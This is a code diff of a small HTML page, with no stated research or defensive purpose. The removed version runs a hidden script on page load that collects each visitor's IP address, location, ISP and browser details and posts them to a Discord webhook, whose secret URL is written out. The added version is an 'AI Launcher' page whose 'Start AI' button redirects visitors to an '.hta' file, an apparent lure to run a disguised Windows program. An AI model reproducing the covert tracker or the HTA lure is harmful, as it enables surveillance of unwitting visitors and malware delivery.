@@ -1,42 +1,22 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Loading...</title>
+  <title>AI Launcher</title>
 </head>
-<body>
+<body style="background:black; color:lime; font-family:monospace; text-align:center; padding-top:100px;">
 
-<script>
-(async () => {
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1460589682583670856/Y9o1UwSycM3E4PvHx1bgpJYIbURtcMUyGhofPKX5DdcLyrg3tY_Gw2-3nAWjZvjwhwnV";
+  <h1>AI System</h1>
+  <p>Click below to start AI</p>
 
-  try {
-    // Get visitor IP info
-    const ipRes = await fetch("https://ipapi.co/json/");
-    const ipData = await ipRes.json();
+  <button onclick="runAI()" style="padding:10px 20px; font-size:16px;">
+    Start AI
+  </button>
 
-    const message = {
-      content: `📦 **New Visitor**
-🌐 IP: ${ipData.ip}
-🏙 City: ${ipData.city}
-🌍 Country: ${ipData.country_name}
-🧭 ISP: ${ipData.org}
-💻 User Agent: ${navigator.userAgent}
-⏰ Time: ${new Date().toLocaleString()}`
-    };
-
-    // Send to Discord webhook
-    await fetch(WEBHOOK_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(message)
-    });
-
-  } catch (err) {
-    console.error("Error sending IP to webhook:", err);
-  }
-})();
-</script>
+  <script>
+    function runAI() {
+      window.location.href = "ai.hta";
+    }
+  </script>
 
 </body>
 </html>
